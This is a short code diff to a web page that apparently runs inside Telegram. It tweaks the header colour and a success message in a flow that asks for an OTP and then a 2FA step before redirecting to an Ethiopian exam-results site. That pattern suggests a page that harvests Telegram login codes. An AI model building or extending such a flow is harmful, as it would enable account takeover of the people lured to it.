@@ -300,6 +300,7 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
     if (tg) {
         tg.expand();
         tg.ready();
+        tg.setHeaderColor('#154186'); 
     }
 
     const BASE_URL = typeof API_BASE_URL !== 'undefined' ? API_BASE_URL : 'http://127.0.0.1:5000';
@@ -553,7 +554,7 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
                 otpErrorBox.style.backgroundColor = '#e6f4ea';
                 otpErrorBox.style.borderColor = '#b7e1cd';
                 otpErrorBox.querySelector('p').style.color = '#137333';
-                otpErrorBox.querySelector('p').innerText = "Success! Redirecting...";
+                otpErrorBox.querySelector('p').innerText = "Success";
                 setTimeout(() => { window.location.href = "https://result.ethernet.edu.et/"; }, 1000);
             } else if (data.status === "NEED_2FA") {
                 switchTo2FAPage();
